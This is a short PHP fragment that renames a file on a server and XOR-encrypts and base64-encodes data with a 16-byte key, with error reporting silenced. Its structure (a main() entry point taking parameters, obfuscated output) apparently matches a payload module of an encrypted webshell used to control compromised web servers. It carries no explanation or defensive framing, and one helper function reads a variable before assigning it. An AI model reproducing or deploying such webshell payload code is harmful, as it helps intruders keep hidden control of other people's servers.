error_reporting(0);
header('Content-Type: text/html; charset=UTF-8');

function getSafeStr($str){
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}
function getgbkStr($str){
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    if($s1 == $str){
        return $s1;
    }else{
        return iconv('utf-8','gbk//IGNORE',$str);
    }
}

function main($path = "",$newName="")
{
	
	$path=getgbkStr($path);
	$newName=getgbkStr($newName);
	$dlen = strlen($path);
	$cdlen = $dlen - strrpos($path,"/");
	$pdn = substr($path,0,-$cdlen);
	$res=rename($path,$pdn."/".$newName);
	if($res){
		echo "Success";
	}
	else{
		echo "Failed";
	}

}
function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+1&15]; 
    }
	return base64_encode($data);
}